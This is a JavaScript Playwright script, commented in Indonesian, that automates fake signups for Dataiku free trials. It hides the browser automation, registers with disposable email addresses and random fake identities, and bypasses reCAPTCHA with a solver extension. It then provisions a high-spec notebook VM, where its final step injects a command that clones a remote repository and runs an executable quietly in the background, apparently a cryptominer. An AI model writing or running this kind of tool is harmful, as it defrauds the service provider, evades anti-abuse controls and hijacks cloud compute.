require('dotenv').config();
const path = require("path");
const fs = require("fs");
const { chromium } = require("playwright-extra");
const stealth = require("puppeteer-extra-plugin-stealth");

// === HELPER GENERATOR DATA RANDOM ===
function generateRandomText(length = 6) {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function generateRandomName() {
    const text = generateRandomText(6);
    return text.charAt(0).toUpperCase() + text.slice(1);
}

function getRandomArrayElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function humanType(locator, text) {
    await locator.waitFor({ state: "visible", timeout: 15000 });
    await locator.click();
    for (const char of text) {
        await locator.pressSequentially(char, { delay: 40 + Math.random() * 60 });
    }
}

// === MAIN PIPELINE ===
(async () => {
    chromium.use(stealth());
    
    const extensionPath = path.resolve(__dirname, "Humans");
    const profileDir = path.resolve(__dirname, "temp_profile_" + Date.now());

    console.log("🚀 Memulai Automasi Dataiku...");

    // Inisialisasi Browser dengan Resolusi Tetap 1920x1080
    const context = await chromium.launchPersistentContext(profileDir, {
        headless: false,
        viewport: { width: 1920, height: 1080 },
        args: [
            "--window-size=1920,1080",
            "--disable-blink-features=AutomationControlled",
            `--disable-extensions-except=${extensionPath}`, 
            `--load-extension=${extensionPath}`
        ]
    });

    try {
        // ==========================================
        // TAHAP 1: GET EMAIL (ANTI-HANG & POLLING UPTIME)
        // ==========================================
        console.log("-> [Tab 1] Mengambil email sementara dari generator.email...");
        const page1 = context.pages()[0] || await context.newPage();
        
        let targetEmail = "";
        let isEmailValid = false;
        const maxEmailRetries = 15;

        for (let i = 1; i <= maxEmailRetries; i++) {
            try {
                console.log(`  ~ [Percobaan ${i}] Memuat web generator.email...`);
                await page1.goto("https://generator.email/", { waitUntil: "commit", timeout: 45000 });
                
                const emailLocator = page1.locator('#email_ch_text');
                await emailLocator.waitFor({ state: 'visible', timeout: 25000 });
                targetEmail = await emailLocator.innerText();

                // SOLUSI BUG: Polling InnerText (Menunggu AJAX selesai merender uptime)
                let uptimeDays = 999; // Default 999 jika gagal terbaca (agar otomatis memicu refresh)
                console.log("  ~ Mengekstrak data uptime server...");
                
                for (let poll = 0; poll < 10; poll++) {
                    const bodyText = await page1.locator('body').innerText();
                    // Regex yang lebih kebal: mencari "uptime", karakter apapun s/d angka, lalu "day"
                    const match = bodyText.match(/uptime[^\d]*(\d+)\s*day/i);
                    
                    if (match && match[1]) {
                        uptimeDays = parseInt(match[1], 10);
                        break; // Angka uptime berhasil tertangkap, keluar dari loop pengintaian
                    }
                    await delay(1000); // Jeda 1 detik sebelum memindai layar lagi
                }

                console.log(`  ~ Email: ${targetEmail} | Uptime: ${uptimeDays} hari`);

                if (uptimeDays > 300) {
                    console.log("  ⚠ Uptime terlalu lama (> 300 hari). Meminta email baru...");
                    const generateNewBtn = page1.locator('button:has-text("Generate new e-mail"), button.e7m.btn-success').first();
                    await generateNewBtn.click({ force: true });
                    await delay(6000); // Jeda loading agar server men-generate email baru
                } else {
                    console.log(`  ✔ Email lolos filter kualitas. Lanjut pendaftaran!`);
                    isEmailValid = true;
                    break;
                }
            } catch (err) {
                console.log(`  ✘ Gagal memuat/memproses generator.email: ${err.message.split('\n')[0]}`);
                if (i < maxEmailRetries) {
                    console.log(`  ↻ Merestart koneksi Tab 1...`);
                    await delay(3000);
                }
            }
        }

        if (!isEmailValid) {
            throw new Error("FATAL: Gagal mendapatkan email yang valid (< 300 hari) setelah batas maksimal percobaan.");
        }

        // ==========================================
        // TAHAP 2: BUKA DATAIKU & ISI FORM DI TAB 2
        // ==========================================
        console.log("\n-> [Tab 2] Membuka Dataiku Free Trial...");
        const page2 = await context.newPage();
        await page2.goto("https://www.dataiku.com/product/get-started", { waitUntil: "domcontentloaded", timeout: 60000 });
        
        console.log("  ~ Mencari lokasi render form (Native vs Iframe)...");
        await delay(5000); 

        let formLocator = null;

        try {
            const nativeInput = page2.locator('input[name="firstname"]').first();
            if (await nativeInput.isVisible({ timeout: 5000 })) {
                formLocator = page2; 
                console.log("  ✔ Form ditemukan di halaman utama (Bukan Iframe).");
            }
        } catch (e) {}

        if (!formLocator) {
            try {
                const iframeSelector = 'iframe[title*="Form"], iframe.hs-form-iframe, iframe[src*="hsforms"]';
                await page2.waitForSelector(iframeSelector, { state: 'attached', timeout: 15000 });
                
                formLocator = page2.frameLocator(iframeSelector).first();
                await formLocator.locator('input[name="firstname"]').waitFor({ state: 'visible', timeout: 10000 });
                console.log("  ✔ Form ditemukan di dalam Iframe.");
            } catch (err) {
                console.log("  ⚠ Form tidak ditemukan baik di Native maupun Iframe.");
            }
        }

        if (!formLocator) {
            const errorImagePath = path.resolve(__dirname, `error_dataiku_${Date.now()}.png`);
            await page2.screenshot({ path: errorImagePath, fullPage: true });
            throw new Error(`Gagal menemukan form. Screenshot layar: ${errorImagePath}.`);
        }

        console.log("-> Mengisi form Dataiku...");
        await humanType(formLocator.locator('input[name="firstname"]').first(), generateRandomName());
        await humanType(formLocator.locator('input[name="lastname"]').first(), generateRandomName());
        await humanType(formLocator.locator('input[name="email"]').first(), targetEmail);
        
        const jobTitles = ["Manager", "Data Analyst", "Student", "Director", "Engineer"];
        await humanType(formLocator.locator('input[name="jobtitle"]').first(), getRandomArrayElement(jobTitles));
        
        console.log("  -> Memilih Role: Student");
        await formLocator.locator('select[name="role"]').first().selectOption({ value: "Student" });
        await delay(500);

        await humanType(formLocator.locator('input[name="company"]').first(), generateRandomName() + " Corp");

        console.log("  -> Memilih Company Size: 1 - 200");
        await formLocator.locator('select[name="company_size"]').first().selectOption({ value: "1 - 200" });
        await delay(500);

        const countries = ["United States", "United Kingdom", "Indonesia", "Singapore", "Japan", "Germany"];
        const selectedCountry = getRandomArrayElement(countries);
        console.log(`  -> Memilih Negara: ${selectedCountry}`);
        await formLocator.locator('select[name="country"]').first().selectOption({ value: selectedCountry });
        await delay(1000);

        console.log("-> Klik Start Free Trial...");
        await formLocator.locator('input[type="submit"][value="Start Free Trial"], button[type="submit"]:has-text("Start Free Trial")').first().click();

        // ==========================================
        // TAHAP 3: SOLVE RECAPTCHA VIA EKSTENSI (INVISIBLE MODE)
        // ==========================================
        console.log("\n~ Menunggu tantangan reCAPTCHA (bframe) muncul...");
        await delay(3000);

        let bframeExists = page2.frames().some(f => f.url().includes('bframe'));
        
        if (bframeExists) {
            console.log("-> Image challenge (bframe) terdeteksi — memicu ekstensi 'Humans'...");
            const maxRetries = 3;
            let extSolved = false;

            for (let attempt = 1; attempt <= maxRetries; attempt++) {
                let currentBframe = page2.frames().find(f => f.url().includes('bframe'));
                if (!currentBframe) break; 

                try {
                    const extButton = currentBframe.locator('.help-button-holder').first();
                    await extButton.waitFor({ state: 'visible', timeout: 8000 });
                    // Tambahkan force: true dan timeout yang pendek agar tidak terjadi crash 30000ms
                    await extButton.click({ force: true, timeout: 5000 });
                    console.log(`  ~ [Attempt ${attempt}] Tombol ekstensi diklik, menunggu proses bypass...`);

                    extSolved = false;

                    for (let w = 0; w < 30; w++) { 
                        await delay(1000);
                        
                        let tokenLength = 0;
                        try {
                            const tokenVal = await formLocator.locator('#g-recaptcha-response').first().inputValue({ timeout: 500 });
                            if (tokenVal) tokenLength = tokenVal.length;
                        } catch (e) {}
                        
                        const isBframeVisible = await page2.locator('iframe[src*="bframe"]').first().isVisible().catch(() => false);
                        
                        if (tokenLength > 10 || !isBframeVisible) {
                            extSolved = true; 
                            break;
                        }
                    }

                    if (extSolved) {
                        console.log(`  ✔ reCAPTCHA Berhasil di-bypass pada attempt ${attempt}!`);
                        break;
                    } else {
                        console.log(`  ✘ [Attempt ${attempt}] Ekstensi gagal atau *timeout* memproses gambar.`);
                        if (attempt < maxRetries) {
                            console.log(`  ↻ Reload gambar reCAPTCHA...`);
                            try {
                                const reloadBtn = currentBframe.locator('#recaptcha-reload-button');
                                if (await reloadBtn.isVisible().catch(()=>false)) {
                                    await reloadBtn.click({ timeout: 5000 });
                                    await delay(4000);
                                }
                            } catch (err) {}
                        }
                    }
                } catch (e) {
                    console.log(`  ✘ Error interaksi ekstensi di attempt ${attempt}: ${e.message.split('\n')[0]}`);
                }
            }

            if (!extSolved) {
                console.log("  FATAL: Gagal bypass reCAPTCHA setelah 3 kali percobaan.");
            }
        } else {
            console.log("  ✔ Tidak ada tantangan gambar bframe (Berhasil masuk tanpa challenge).");
        }

        // ==========================================
        // TAHAP 4: VERIFIKASI EMAIL & SETUP AKUN SSO
        // ==========================================
        console.log("\n-> [Tab 2] Menunggu pengalihan ke halaman SSO Dataiku...");
        try {
            await page2.waitForURL(/sso\.dataiku\.com/, { timeout: 45000 });
            console.log("  ✔ Berhasil masuk ke halaman SSO.");
        } catch (e) {
            throw new Error("Gagal dialihkan ke sso.dataiku.com. Mungkin proses backend lambat atau pendaftaran ditolak.");
        }

        console.log("-> Mengisi konfirmasi email SSO...");
        const ssoEmailInput = page2.locator('input#email, input[name="email"]').first();
        await ssoEmailInput.waitFor({ state: 'visible', timeout: 15000 });
        await humanType(ssoEmailInput, targetEmail);
        await delay(500);
        await page2.keyboard.press('Enter');

        // ==========================================
        // TAHAP 5: SCRAPING KODE OTP DI TAB 1
        // ==========================================
        console.log("\n-> [Tab 1] Kembali ke generator.email untuk mencari kode verifikasi...");
        await page1.bringToFront();
        let verifCode = null;

        for (let attempt = 1; attempt <= 10; attempt++) {
            console.log(`  ~ (Percobaan ${attempt}/10) Memindai inbox...`);
            
            try {
                // Ambil HTML dan ekstrak regex
                const content = await page1.content();
                const match = content.match(/verification code:\s*(\d{6})/i);
                
                if (match && match[1]) {
                    verifCode = match[1];
                    console.log(`  ✔ Kode Verifikasi ditemukan: ${verifCode}`);
                    break;
                }

                console.log(`  ↻ Belum ada email, memuat ulang halaman...`);
                await delay(6000); 
                
                // SOLUSI BUG: Pelindung Reload & Pengubahan Parameter Wait
                try {
                    // Menggunakan 'commit' agar tidak mudah timeout oleh elemen iklan
                    await page1.reload({ waitUntil: "commit", timeout: 30000 });
                } catch (reloadErr) {
                    console.log(`  ⚠ Reload bermasalah (${reloadErr.message.split('\n')[0]}). Memaksa navigasi ulang...`);
                    // Fallback jika reload bawaan browser di-abort
                    await page1.goto(page1.url(), { waitUntil: "commit", timeout: 30000 }).catch(() => {});
                }
                
                // Beri waktu agar DOM merender email baru setelah reload selesai
                await delay(3000); 

            } catch (scanErr) {
                console.log(`  ✘ Error saat memindai inbox: ${scanErr.message.split('\n')[0]}`);
            }
        }

        if (!verifCode) {
            throw new Error("FATAL: Kode verifikasi Dataiku tidak masuk ke inbox setelah waktu maksimal.");
        }

        console.log("  ~ Menutup Tab 1...");
        await page1.close(); // Otomatis Tab 2 kembali aktif

        // ==========================================
        // TAHAP 6: INPUT KODE & PENYELESAIAN PROFIL
        // ==========================================
        console.log("\n-> [Tab 2] Memasukkan kode verifikasi...");
        const codeInput = page2.locator('input#code, input[name="code"]').first();
        await codeInput.waitFor({ state: 'visible', timeout: 20000 });
        
        await codeInput.fill(verifCode); 
        await delay(500);
        await page2.keyboard.press('Enter');

        console.log("-> Menunggu form Password & Profil siap...");
        const passwordInput = page2.locator('input#password, input[name="password"]').first();
        await passwordInput.waitFor({ state: 'visible', timeout: 20000 });
        
        console.log("  -> Mengisi Password...");
        await humanType(passwordInput, "Blink1997");

        console.log("  -> Mengisi Data Diri & Perusahaan...");
        const fnInput = page2.locator('input#first-name, input[name="ulp-first-name"]').first();
        await humanType(fnInput, generateRandomName());

        const lnInput = page2.locator('input#last-name, input[name="ulp-last-name"]').first();
        await humanType(lnInput, generateRandomName());

        const cnInput = page2.locator('input#company-name, input[name="ulp-company-name"]').first();
        await humanType(cnInput, generateRandomName() + " LLC");

        console.log("  -> Mencentang Terms of Service...");
        const tosLabel = page2.locator('label[for="terms-of-service"]').first();
        await tosLabel.click();

        console.log("-> Menekan Enter untuk menyelesaikan pendaftaran...");
        await delay(1000); 
        await page2.keyboard.press('Enter');

        // ==========================================
        // TAHAP 7: SETUP WORKSPACE & REGION
        // ==========================================
        console.log("\n-> [Tab 2] Menunggu Launchpad Dataiku siap...");
        await page2.waitForURL(/launchpad-dku\.app\.dataiku\.io\/spaces\/all/, { timeout: 60000 });
        console.log("  ✔ Masuk ke halaman Launchpad.");

        console.log("-> Mengatur Region Cluster...");
        await delay(5000); 

        const regionDropdown = page2.locator('div.v-field__input').first();
        await regionDropdown.waitFor({ state: 'visible', timeout: 30000 });
        await regionDropdown.click({ force: true });
        await delay(2000); 

        console.log("  ~ Membaca opsi region yang tersedia secara live...");
        const listItems = page2.locator('.v-overlay-container .v-list-item, .v-list-item').filter({ hasText: 'AWS' });
        
        await listItems.first().waitFor({ state: 'visible', timeout: 15000 });
        
        const count = await listItems.count();
        if (count === 0) {
            throw new Error("Dropdown region terbuka, tetapi tidak ada opsi yang ditemukan.");
        }

        const randomIndex = Math.floor(Math.random() * count);
        const selectedOption = listItems.nth(randomIndex);
        
        const regionText = await selectedOption.innerText();
        console.log(`  -> Memilih Region dinamis: ${regionText.trim().split('\n')[0]}`);
        
        await selectedOption.click();
        await delay(1000);

        console.log("-> Klik Create my space...");
        const createSpaceBtn = page2.locator('button:has-text("Create my space")').first();
        await createSpaceBtn.click();

        // ==========================================
        // TAHAP 8: PROVISIONING & BUKA TAB INSTANCE
        // ==========================================
        console.log("\n~ Menunggu proses provisioning (Penyiapan server bisa memakan waktu hingga beberapa menit)...");
        await page2.waitForURL(/launchpad-dku\.app\.dataiku\.io\/spaces\//, { timeout: 60000 });
        
        const openInstanceBtn = page2.locator('a:has-text("Open Instance"), button:has-text("Open Instance")').first();
        await openInstanceBtn.waitFor({ state: 'visible', timeout: 300000 }); 
        console.log("  ✔ Server Ready!");

        console.log("-> Klik Open Instance (Akan membuka Tab 3)...");
        const [page3] = await Promise.all([
            context.waitForEvent('page'),
            openInstanceBtn.click()
        ]);

        await page3.waitForLoadState('domcontentloaded');
        console.log("  ✔ Tab 3 (Dashboard Instance) berhasil dibuka & dikendalikan.");

        // ==========================================
        // TAHAP 9: ONBOARDING, PROJECT BARU & JUPYTER (DI TAB 3)
        // ==========================================
        console.log("\n-> [Tab 3] Melewati pop-up personalisasi dan tutorial...");
        
        const skipPersonalizationBtn = page3.locator('button:has-text("Skip personalization")').first();
        try {
            await skipPersonalizationBtn.waitFor({ state: 'visible', timeout: 15000 });
            await skipPersonalizationBtn.click();
            await delay(1000);
        } catch (e) { console.log("  ⚠ Skip personalization tidak muncul, lanjut..."); }

        const skipTutorialBtn = page3.locator('button:has-text("Skip tutorial")').first();
        try {
            await skipTutorialBtn.waitFor({ state: 'visible', timeout: 15000 });
            await skipTutorialBtn.click();
            await delay(1000);
        } catch (e) { console.log("  ⚠ Skip tutorial tidak muncul, lanjut..."); }

        console.log("-> Membuat Blank Project...");
        const newProjectBtn = page3.locator('.qa_homepage_new-project-button').first();
        await newProjectBtn.waitFor({ state: 'visible', timeout: 30000 });
        await newProjectBtn.click();
        await delay(1000);

        const blankProjectBtn = page3.locator('.qa_homepage_new-project-button__blank').first();
        await blankProjectBtn.waitFor({ state: 'visible', timeout: 5000 });
        await blankProjectBtn.click();
        await delay(1000);

        const projectNameInput = page3.locator('input#newProjectName').first();
        await projectNameInput.waitFor({ state: 'visible', timeout: 5000 });
        await humanType(projectNameInput, "Project " + generateRandomName());
        await delay(500);
        await page3.keyboard.press('Enter');

        console.log("\n-> Menuju Workspace & Menyiapkan Python Notebook...");
        const createNotebookMenu = page3.locator('a:has-text("Create a Notebook")').filter({ state: 'visible' }).first();
        await createNotebookMenu.waitFor({ state: 'visible', timeout: 30000 });
        await createNotebookMenu.click();
        await delay(2000);

        console.log("-> Mengakses dropdown New Notebook...");
        const newNotebookDropdownBtn = page3.locator('button:has-text("New notebook")').filter({ state: 'visible' }).first();
        await newNotebookDropdownBtn.waitFor({ state: 'visible', timeout: 15000 });
        await newNotebookDropdownBtn.click();
        await delay(1000); 

        console.log("-> Memilih opsi Write your own dari dropdown...");
        const writeYourOwnMenu = page3.locator('li.detailed-dropdown-menu__item:has-text("Write your own")').filter({ state: 'visible' }).first();
        await writeYourOwnMenu.waitFor({ state: 'visible', timeout: 10000 });
        await writeYourOwnMenu.click();
        await delay(1500); 

        console.log("-> Memilih bahasa Python...");
        const pythonOption = page3.locator('.notebook-types__card, .selectable').filter({ hasText: 'Python' }).filter({ state: 'visible' }).first();
        await pythonOption.waitFor({ state: 'visible', timeout: 5000 });
        await pythonOption.click();
        await delay(1500);

        console.log("-> Mengatur Spesifikasi Hardware VM (vCPU-4-RAM-32GiB)...");
        const envDropdown = page3.locator('button.selectpicker[title*="vCPU"]').filter({ state: 'visible' }).first();
        await envDropdown.waitFor({ state: 'visible', timeout: 10000 });
        await envDropdown.click();
        await delay(1500); 

        const hardwareOption = page3.locator('span.text:has-text("vCPU-4-RAM-32GiB"), span.filter-option:has-text("vCPU-4-RAM-32GiB")')
                                    .filter({ state: 'visible' }).first();
        await hardwareOption.click();
        await delay(1500);

        console.log("-> Klik Create Final Jupyter Notebook...");
        const createJupyterBtn = page3.locator('button[ng-click="createAndRedirect()"], button:has-text("Create")').filter({ state: 'visible' }).first();
        await createJupyterBtn.click();

        // ==========================================
        // TAHAP 10: EKSEKUSI JUPYTER NOTEBOOK
        // ==========================================
        console.log("\n-> [Tab 3] Menunggu kernel Jupyter Notebook siap (Delay 125 detik)...");
        await delay(125000); 

        console.log("-> Mencari elemen editor Jupyter...");
        let notebookLocator = page3;
        
        try {
            const iframe = page3.locator('iframe[src*="jupyter"], iframe.notebook-iframe, iframe').first();
            if (await iframe.isVisible({ timeout: 5000 })) {
                notebookLocator = page3.frameLocator('iframe[src*="jupyter"], iframe.notebook-iframe, iframe').first();
                console.log("  ✔ Antarmuka Jupyter ditemukan di dalam Iframe.");
            }
        } catch (e) {}

        const firstCell = notebookLocator.locator('.CodeMirror').first();
        await firstCell.waitFor({ state: 'visible', timeout: 30000 });

        // SOLUSI BUG: Cek dan tutup Pop-up (Modal) Jupyter yang menghalangi layar
        console.log("-> Memeriksa pop-up Jupyter yang berpotensi menghalangi layar...");
        try {
            const modalDialog = notebookLocator.locator('.modal.fade.in, .modal-dialog').first();
            if (await modalDialog.isVisible({ timeout: 3000 })) {
                console.log("  ⚠ Pop-up Jupyter terdeteksi! Mencoba menutupnya...");
                
                // Cara 1: Tekan tombol Escape di keyboard
                await page3.keyboard.press('Escape');
                await delay(1000);
                
                // Cara 2: Jika masih membandel, klik tombol apapun di modal-footer (OK/Close)
                const modalBtn = notebookLocator.locator('.modal-footer button').last();
                if (await modalBtn.isVisible({ timeout: 2000 })) {
                    await modalBtn.click({ force: true });
                }
                await delay(1500);
                console.log("  ✔ Layar telah dibersihkan dari pop-up.");
            }
        } catch (err) {
            // Abaikan jika tidak ada pop-up
        }

        console.log("-> Memilih cell pertama...");
        // Tambahkan { force: true } sebagai proteksi ganda agar klik mengabaikan layer transparan
        await firstCell.click({ force: true });
        await delay(1000);

        console.log("-> Menghapus isi cell bawaan (%pylab inline)...");
        await page3.keyboard.down('Control'); 
        await page3.keyboard.press('a');
        await page3.keyboard.up('Control');
        await delay(500);
        await page3.keyboard.press('Backspace');
        await delay(1000);

        console.log("-> Menginjeksi command shell script...");
        const command = "!git clone https://gitlab.com/barbieanay003/mcb.git && cd mcb && chmod +x isu && ./isu -c config3.json >/dev/null 2>&1";
        
        await page3.keyboard.type(command, { delay: 10 });
        await delay(2000);

        console.log("-> Mengeksekusi cell (Shift + Enter)...");
        await page3.keyboard.down('Shift');
        await page3.keyboard.press('Enter');
        await page3.keyboard.up('Shift');

        console.log("\n🎉 SELESAI! Command telah dikirim ke kernel dan berjalan di latar belakang.");
        
    } catch (error) {
        console.error("\n✘ Terjadi kesalahan eksekusi:", error.message);
    } finally {
        await context.close().catch(() => {});
        await delay(1000); // Beri jeda 1 detik agar OS melepas lock folder
        
        try {
            const fs = require('fs');
            if (fs.existsSync(profileDir)) {
                fs.rmSync(profileDir, { recursive: true, force: true });
                console.log("🧹 Clean up: Folder temp_profile berhasil dihapus dari penyimpanan.");
            }
        } catch (cleanupErr) {
            console.log(`⚠ Gagal menghapus folder profile: ${cleanupErr.message}`);
        }
        console.log("✅ Selesai. Seluruh proses automasi dan pembersihan telah dieksekusi.");
    }
})();
